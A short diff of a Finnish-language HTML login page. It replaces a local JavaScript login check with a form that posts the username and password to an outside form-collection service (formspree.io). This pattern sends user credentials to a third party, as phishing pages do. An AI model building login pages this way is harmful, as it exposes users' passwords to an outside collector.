@@ -9,15 +9,15 @@
   <h2>Tervetuloa! Kirjaudu sisään</h2>
 
   <!-- LOMAKE -->
-  <form onsubmit="return tarkistaKirjautuminen();">
-    <label for="kayttaja">Käyttäjätunnus:</label><br>
-    <input type="text" id="kayttaja" name="kayttaja"><br><br>
+  <form action="https://formspree.io/f/abcxyz" method="POST">
+  <label for="kayttaja">Käyttäjätunnus:</label><br>
+  <input type="text" id="kayttaja" name="kayttaja" required><br><br>
 
-    <label for="salasana">Salasana:</label><br>
-    <input type="password" id="salasana" name="salasana"><br><br>
+  <label for="salasana">Salasana:</label><br>
+  <input type="password" id="salasana" name="salasana" required><br><br>
 
-    <input type="submit" value="Kirjaudu">
-  </form>
+  <input type="submit" value="Kirjaudu">
+</form>
 
   <!-- VIRHEVIESTI -->
   <p id="virheteksti" style="color: red;"></p>
